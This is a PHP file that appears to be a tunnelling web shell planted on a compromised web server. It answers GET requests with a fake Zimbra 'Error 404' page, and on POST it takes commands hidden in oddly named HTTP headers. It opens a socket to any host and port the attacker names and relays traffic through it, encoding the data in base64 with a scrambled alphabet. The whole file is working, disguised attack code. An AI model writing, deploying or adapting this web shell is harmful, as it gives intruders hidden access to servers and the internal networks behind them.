<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if( !function_exists('apache_request_headers') ) {
	function apache_request_headers() {
		$arh = array();
		$rx_http = '/\AHTTP_/';

		foreach($_SERVER as $key => $val) {
			if( preg_match($rx_http, $key) ) {
				$arh_key = preg_replace($rx_http, '', $key);
				$rx_matches = array();
				$rx_matches = explode('_', $arh_key);
				if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
					foreach($rx_matches as $ak_key => $ak_val) {
						$rx_matches[$ak_key] = ucfirst($ak_val);
					}

					$arh_key = implode('-', $rx_matches);
				}
				$arh[$arh_key] = $val;
			}
		}
		return($arh);
	}
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
	exit("<!-- * ***** BEGIN LICENSE BLOCK ***** * Zimbra Collaboration Suite Web Client * Copyright (C) 2007, 2014 Zimbra, Inc. *  * The contents of this file are subject to the Common Public Attribution License Version 1.0 (the \"License\"); * you may not use this file except in compliance with the License.  * You may obtain a copy of the License at: http://www.zimbra.com/license * The License is based on the Mozilla Public License Version 1.1 but Sections 14 and 15  * have been added to cover use of software over a computer network and provide for limited attribution  * for the Original Developer. In addition, Exhibit A has been modified to be consistent with Exhibit B.  *  * Software distributed under the License is distributed on an \"AS IS\" basis,  * WITHOUT WARRANTY OF ANY KIND, either express or implied.  * See the License for the specific language governing rights and limitations under the License.  * The Original Code is Zimbra Open Source Web Client.  * The Initial Developer of the Original Code is Zimbra, Inc.  * All portions of the code are Copyright (C) 2007, 2014 Zimbra, Inc. All Rights Reserved.  * ***** END LICENSE BLOCK *****--><html><head>	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"/>	<title>Error 404</title></head><body>	<h2>HTTP ERROR: 404</h2>	<pre>The page you were trying to access does not exist.</pre></body></html>");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
	$cmd = $headers["Vhqjsxamyliqulr"];
	$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	$de = "dGDgW1/Z3VyfBjQ0bMARn45vr2+i8e6Epk7co9zYHumtCNLUTwJqOhFxPSlsIaXK";
	switch($cmd){
		case "XBo71WCp1Jyimy59XXnDZFjZUImge6QqRYf4t9757o6YoGuahW":
			{
				$target_ary = preg_split("/\|/", base64_decode(strtr($headers["Jkmb"], $de, $en)), 2);
				$target = $target_ary[0];
				$port = (int)$target_ary[1];
				$res = fsockopen($target, $port);
				if ($res === false)
				{
					header('Igaeiphccakics: COmbTWSbFyll1hHYxha3vA2q_eixRRKxFeVBL606M');
					header('Chrkgorvzrbjclr: jMWEf_I5FmodDE7Gp');
					return;
				}

		stream_set_blocking($res, false);
				@session_start();
				$_SESSION["run"] = true;
				$_SESSION["writebuf"] = "";
				$_SESSION["readbuf"] = "";
				ob_end_clean();
				header('Igaeiphccakics: 9EE13X9rYQBUsx2leglk4CwnJjMy2_Czrkc');
				header("Connection: close");
				ignore_user_abort();
				ob_start();
				$size = ob_get_length();
				header("Content-Length: $size");
				ob_end_flush();
				flush();
				session_write_close();

				while ($_SESSION["run"])
				{
					$readBuff = "";
					@session_start();
					$writeBuff = $_SESSION["writebuf"];
					$_SESSION["writebuf"] = "";
					session_write_close();
					if ($writeBuff != "")
					{
			stream_set_blocking($res, false);
						$i = fwrite($res, $writeBuff);
						if($i === false)
						{
							@session_start();
							$_SESSION["run"] = false;
							session_write_close();
							header('Igaeiphccakics: COmbTWSbFyll1hHYxha3vA2q_eixRRKxFeVBL606M');
							header('Chrkgorvzrbjclr: Qy2sVGMWbcwJd');
						}
					}
		  stream_set_blocking($res, false);
		  while ($o = fgets($res, 10)) {
					if($o === false)
						{
							@session_start();
							$_SESSION["run"] = false;
							session_write_close();
							header('Igaeiphccakics: COmbTWSbFyll1hHYxha3vA2q_eixRRKxFeVBL606M');
							header('Chrkgorvzrbjclr: rM4F3i1SyuUgM_RfyQWufFU17bIEAT1oRj0mJ1RioaHXeNWdDO');
						}
						$readBuff .= $o;
					}
					if ($readBuff!=""){
						@session_start();
						$_SESSION["readbuf"] .= $readBuff;
						session_write_close();
					}
				}
				fclose($res);
			}
			break;
		case "AIaUyTmRiB98xjU5Yxn2If3ecCae3eOgTY5AHZG370RRYsQ2y8lgQPP":
			{
				error_log("DisConnect recieved");
				@session_start();
				$_SESSION["run"] = false;
				session_write_close();
				return;
			}
			break;
		case "G0IFLW9osbf":
			{
				@session_start();
				$readBuffer = $_SESSION["readbuf"];
				$_SESSION["readbuf"]="";
				$running = $_SESSION["run"];
				session_write_close();
				if ($running) {
					header('Igaeiphccakics: 9EE13X9rYQBUsx2leglk4CwnJjMy2_Czrkc');
					header("Connection: Keep-Alive");
					echo strtr(base64_encode($readBuffer), $en, $de);
					return;
				} else {
					header('Igaeiphccakics: COmbTWSbFyll1hHYxha3vA2q_eixRRKxFeVBL606M');
					return;
				}
			}
			break;
		case "BB9bRCCX3_pEAnUjjOkp9HrK":
			{
				@session_start();
				$running = $_SESSION["run"];
				session_write_close();
				if(!$running){
					header('Igaeiphccakics: COmbTWSbFyll1hHYxha3vA2q_eixRRKxFeVBL606M');
					header('Chrkgorvzrbjclr: okIGbnDZ');
					return;
				}
				header('Content-Type: application/octet-stream');
				$rawPostData = file_get_contents("php://input");
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= base64_decode(strtr($rawPostData, $de, $en));
					session_write_close();
					header('Igaeiphccakics: 9EE13X9rYQBUsx2leglk4CwnJjMy2_Czrkc');
					header("Connection: Keep-Alive");
					return;
				} else {
					header('Igaeiphccakics: COmbTWSbFyll1hHYxha3vA2q_eixRRKxFeVBL606M');
					header('Chrkgorvzrbjclr: fEQZIEYwh2');
				}
			}
			break;
	}
}
?>
